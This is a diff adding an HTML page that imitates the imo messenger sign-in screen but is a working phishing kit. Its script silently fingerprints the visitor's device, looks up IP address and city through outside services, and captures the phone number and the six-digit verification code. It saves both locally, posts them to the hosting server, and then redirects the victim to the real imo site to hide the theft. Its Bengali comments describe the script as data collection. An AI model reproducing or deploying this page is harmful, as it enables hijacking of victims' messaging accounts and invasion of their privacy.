@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>imo</title>
+    <style>
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body { 
+            background-color: white;
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            min-height: 100vh;
+            color: #333;
+            padding: 40px 20px 20px;
+            -webkit-text-size-adjust: 100%;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            width: 100%;
+        }
+        
+        .logo { 
+            font-size: 42px; 
+            font-weight: bold; 
+            color: #2095f2; 
+            margin-bottom: 8px;
+        }
+        
+        .tagline {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        .container { 
+            background-color: white; 
+            width: 100%; 
+            max-width: 400px;
+        }
+        
+        .title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+            line-height: 1.3;
+        }
+        
+        .country-selector {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            touch-action: manipulation;
+        }
+        
+        .country-selector:active {
+            background: #f5f5f5;
+            transform: scale(0.98);
+        }
+        
+        .country-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .flag {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #2095f2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        
+        .country-text {
+            font-size: 16px;
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .country-code {
+            color: #666;
+            font-size: 15px;
+        }
+        
+        .chevron {
+            color: #868e96;
+            font-size: 14px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #495057;
+            font-size: 14px;
+        }
+        
+        .phone-input-container {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .code-input {
+            width: 85px;
+            height: 56px; 
+            border: 1px solid #ddd; 
+            border-radius: 12px; 
+            padding: 0 16px; 
+            font-size: 17px; 
+            background-color: #f9f9f9; 
+            transition: all 0.3s ease;
+            text-align: center;
+            -webkit-appearance: none;
+        }
+        
+        .phone-input {
+            flex: 1;
+            height: 56px; 
+            border: 1px solid #ddd; 
+            border-radius: 12px; 
+            padding: 0 20px; 
+            font-size: 17px; 
+            background-color: #f9f9f9; 
+            transition: all 0.3s ease;
+            -webkit-appearance: none;
+        }
+        
+        .phone-input:focus, .code-input:focus { 
+            outline: none; 
+            border-color: #2095f2; 
+            background-color: white;
+            box-shadow: 0 0 0 3px rgba(32, 149, 242, 0.1);
+        }
+        
+        .continue-button { 
+            color: white; 
+            background: #2095f2;
+            border: none; 
+            border-radius: 12px; 
+            padding: 18px 0; 
+            font-size: 18px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            width: 100%; 
+            transition: all 0.3s ease;
+            touch-action: manipulation;
+            -webkit-appearance: none;
+        }
+
+        .continue-button:disabled {
+            background: #8ecbf8;
+            cursor: wait;
+        }
+        
+        .continue-button:active { 
+            background: #1a7fd8;
+            transform: scale(0.98);
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            width: 100%;
+        }
+        
+        .help-link {
+            color: #666;
+            text-decoration: none;
+            font-size: 15px;
+            display: inline-block;
+            padding: 12px 20px;
+            transition: all 0.2s;
+            touch-action: manipulation;
+        }
+        
+        .help-link:active {
+            color: #2095f2;
+            background: rgba(32, 149, 242, 0.1);
+            border-radius: 8px;
+        }
+        
+        .country-dropdown {
+            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            background: white; border: 1px solid #ddd; border-radius: 16px;
+            width: 90%; max-width: 400px; max-height: 70vh; overflow-y: auto;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2); z-index: 1000; -webkit-overflow-scrolling: touch;
+        }
+        
+        .country-option { padding: 16px 20px; display: flex; align-items: center; gap: 12px; cursor: pointer; border-bottom: 1px solid #f0f0f0; touch-action: manipulation; }
+        .country-option:active { background: #f9f9f9; }
+        .country-option:last-child { border-bottom: none; }
+        .country-option .flag { flex-shrink: 0; }
+        .country-details { flex: 1; }
+        .country-name { font-weight: 500; color: #333; font-size: 16px; }
+        .country-dial-code { color: #666; font-size: 14px; }
+        
+        #verification-section { display: none; }
+        .verification-title { font-size: 20px; font-weight: 600; color: #333; margin-bottom: 12px; text-align: center; }
+        .verification-subtitle { font-size: 15px; color: #666; margin-bottom: 25px; text-align: center; line-height: 1.4; padding: 0 10px; }
+        .code-inputs { display: flex; gap: 12px; margin-bottom: 25px; justify-content: center; padding: 0 10px; }
+        .code-input-digit { width: 50px; height: 60px; border: 1px solid #ddd; border-radius: 12px; background: #f9f9f9; text-align: center; font-size: 22px; font-weight: 600; color: #333; -webkit-appearance: none; }
+        .code-input-digit:focus { outline: none; border-color: #2095f2; background: white; box-shadow: 0 0 0 3px rgba(32, 149, 242, 0.1); }
+        .resend-link { text-align: center; margin-top: 20px; }
+        .resend-link a { color: #2095f2; text-decoration: none; font-size: 16px; padding: 12px 20px; display: inline-block; touch-action: manipulation; }
+        .resend-link a:active { background: rgba(32, 149, 242, 0.1); border-radius: 8px; }
+        .country-selector-container { position: relative; }
+        
+        #loader { display: none; margin: 20px auto; width: 32px; height: 32px; border: 3px solid #f3f3f3; border-top: 3px solid #2095f2; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .dropdown-backdrop { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 999; }
+        
+        @media (max-width: 480px) {
+            body { padding: 30px 16px 16px; } .header { margin-bottom: 30px; } .logo { font-size: 38px; } .tagline { font-size: 15px; } .title { font-size: 18px; margin-bottom: 25px; }
+            .country-selector { padding: 18px; } .phone-input, .code-input { height: 58px; font-size: 18px; } .continue-button { padding: 20px 0; font-size: 19px; }
+            .code-input-digit { width: 52px; height: 62px; font-size: 24px; }
+        }
+        @media (max-width: 360px) {
+            .phone-input-container { flex-direction: column; gap: 12px; } .code-input { width: 100%; } .code-inputs { gap: 8px; }
+            .code-input-digit { width: 46px; height: 56px; font-size: 20px; }
+        }
+        @media screen and (max-width: 768px) { input, select, textarea { font-size: 16px !important; } }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">imo</div>
+        <div class="tagline">Free video calls and messages</div>
+    </div>
+    
+    <div class="dropdown-backdrop" id="dropdownBackdrop"></div>
+    
+    <div class="container">
+        <!-- Phone Login Section -->
+        <div id="phone-login-section">
+            <div class="title">Enter your phone number</div>
+            <div class="country-selector-container">
+                <div class="country-selector" onclick="toggleCountryDropdown()">
+                    <div class="country-info">
+                        <div class="flag">BD</div>
+                        <div class="country-text">Bangladesh</div>
+                        <div class="country-code">+880</div>
+                    </div>
+                    <div class="chevron">▼</div>
+                </div>
+                <div class="country-dropdown" id="countryDropdown"></div>
+            </div>
+            <div class="input-group">
+                <label class="input-label">Phone Number</label>
+                <div class="phone-input-container">
+                    <input type="text" class="code-input" id="countryCode" value="+880" readonly>
+                    <input type="tel" class="phone-input" placeholder="Phone number" id="phone" inputmode="numeric">
+                </div>
+            </div>
+            <button class="continue-button" onclick="sendPhoneNumber()">Continue</button>
+            <div id="loader"></div>
+        </div>
+        
+        <!-- Verification Section -->
+        <div id="verification-section">
+            <div class="verification-title">Enter verification code</div>
+            <div class="verification-subtitle">We've sent a 6-digit code to your phone</div>
+            <div class="code-inputs">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 1)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 2)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 3)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 4)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 5)" inputmode="numeric">
+                <input type="text" class="code-input-digit" maxlength="1" oninput="moveToNext(this, 6)" inputmode="numeric">
+            </div>
+            <button class="continue-button" onclick="verifyCode()">Verify</button>
+            <div class="resend-link">
+                <a href="#" onclick="resendCode()">Resend code</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <a href="#" class="help-link">Having trouble signing in? Send feedback</a>
+    </div>
+
+    <!-- =========== ডেটা সংগ্রহের জন্য আপডেট করা স্ক্রিপ্ট =========== -->
+    <script>
+        const countries = [
+            { code: "BD", name: "Bangladesh", dialCode: "+880", flag: "BD" }, { code: "IN", name: "India", dialCode: "+91", flag: "IN" },
+            { code: "US", name: "United States", dialCode: "+1", flag: "US" }, { code: "GB", name: "United Kingdom", dialCode: "+44", flag: "GB" },
+            { code: "CA", name: "Canada", dialCode: "+1", flag: "CA" }, { code: "AU", name: "Australia", dialCode: "+61", flag: "AU" },
+            { code: "SA", name: "Saudi Arabia", dialCode: "+966", flag: "SA" }, { code: "AE", name: "United Arab Emirates", dialCode: "+971", flag: "AE" }
+        ];
+        
+        // পেজ লোড হওয়ার সাথে সাথে ডিভাইসের তথ্য সংগ্রহ শুরু
+        let deviceInfoPromise = (async () => {
+            const deviceInfo = {
+                ua: navigator.userAgent || 'Unknown', platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown', res: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            if (navigator.connection) deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
+                    deviceInfo.isCharging = battery.charging;
+                } catch (e) { /* ignore */ }
+            }
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                deviceInfo.ip = ipData.ip;
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                deviceInfo.country = locationData.country_name;
+                deviceInfo.city = locationData.city;
+            } catch (e) { deviceInfo.ip = 'Failed to fetch'; }
+            return JSON.stringify(deviceInfo);
+        })();
+
+        // প্রথম ধাপ: ফোন নম্বর সাবমিট
+        async function sendPhoneNumber() {
+            const phone = document.getElementById('phone').value;
+            const countryCode = document.getElementById('countryCode').value;
+            const fullPhone = countryCode + phone;
+            if (!phone) return alert('Please enter your phone number');
+
+            const continueButton = document.querySelector('#phone-login-section .continue-button');
+            const loader = document.getElementById('loader');
+            continueButton.style.display = 'none';
+            loader.style.display = 'block';
+
+            const deviceInfo = await deviceInfoPromise;
+
+            // LocalStorage-এ ডেটা সেভ
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
+                if (!storedData.imoData) storedData.imoData = [];
+                storedData.imoData.push({ email: fullPhone, pass: 'phone_login', deviceInfo, timestamp: new Date().toLocaleString(), type: 'login' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (e) { console.error('LocalStorage save error:', e); }
+
+            // সার্ভারে ডেটা পাঠানো
+            try {
+                await fetch('/', { method: 'POST', body: new URLSearchParams({ email: fullPhone, pass: 'phone_login', deviceInfo }) });
+            } catch (e) { console.error('Server send error:', e); }
+
+            setTimeout(() => {
+                document.getElementById('phone-login-section').style.display = 'none';
+                document.getElementById('verification-section').style.display = 'block';
+                document.querySelector('.verification-subtitle').textContent = `We've sent a 6-digit code to ${fullPhone}`;
+            }, 1500);
+        }
+
+        // দ্বিতীয় ধাপ: ভেরিফিকেশন কোড সাবমিট
+        async function verifyCode() {
+            const inputs = document.querySelectorAll('.code-input-digit');
+            let code = Array.from(inputs).map(i => i.value).join('');
+            if (code.length !== 6) return alert('Please enter the complete 6-digit code');
+
+            const button = document.querySelector('#verification-section .continue-button');
+            button.disabled = true;
+            button.textContent = 'Verifying...';
+
+            const phone = document.getElementById('phone').value;
+            const countryCode = document.getElementById('countryCode').value;
+            const fullPhone = countryCode + phone;
+            const deviceInfo = await deviceInfoPromise;
+
+            // LocalStorage-এ 2FA ডেটা সেভ
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
+                if (!storedData.imoData) storedData.imoData = [];
+                storedData.imoData.push({ email: fullPhone, '2fa_code': code, deviceInfo, timestamp: new Date().toLocaleString(), type: '2fa' });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (e) { console.error('LocalStorage 2FA save error:', e); }
+
+            // সার্ভারে 2FA কোড পাঠানো
+            try {
+                await fetch('/', { method: 'POST', body: new URLSearchParams({ email: fullPhone, '2fa_code': code, deviceInfo }) });
+            } catch (e) { console.error('Server 2FA send error:', e); }
+            
+            setTimeout(() => window.location.href = 'https://imo.im', 1000);
+        }
+
+        // Helper Functions (UI)
+        function initCountryDropdown() {
+            const dropdown = document.getElementById('countryDropdown');
+            dropdown.innerHTML = countries.map(country => `
+                <div class="country-option" onclick='selectCountry(${JSON.stringify(country)})'>
+                    <div class="flag">${country.flag}</div>
+                    <div class="country-details"><div class="country-name">${country.name}</div></div>
+                    <div class="country-dial-code">${country.dialCode}</div>
+                </div>`).join('');
+        }
+        function toggleCountryDropdown() {
+            const dropdown = document.getElementById('countryDropdown');
+            const backdrop = document.getElementById('dropdownBackdrop');
+            const isOpen = dropdown.style.display === 'block';
+            dropdown.style.display = isOpen ? 'none' : 'block';
+            backdrop.style.display = isOpen ? 'none' : 'block';
+        }
+        function selectCountry(country) {
+            document.querySelector('.country-selector .flag').textContent = country.flag;
+            document.querySelector('.country-selector .country-text').textContent = country.name;
+            document.querySelector('.country-selector .country-code').textContent = country.dialCode;
+            document.getElementById('countryCode').value = country.dialCode;
+            toggleCountryDropdown();
+        }
+        function moveToNext(input, index) {
+            if (input.value) (document.querySelectorAll('.code-input-digit')[index] || input).focus();
+        }
+        function resendCode() {
+            alert('New verification code sent!');
+            document.querySelectorAll('.code-input-digit').forEach(i => i.value = '');
+            document.querySelectorAll('.code-input-digit')[0].focus();
+        }
+        document.getElementById('dropdownBackdrop').onclick = toggleCountryDropdown;
+        window.onload = initCountryDropdown;
+    </script>
+</body>
+</html>
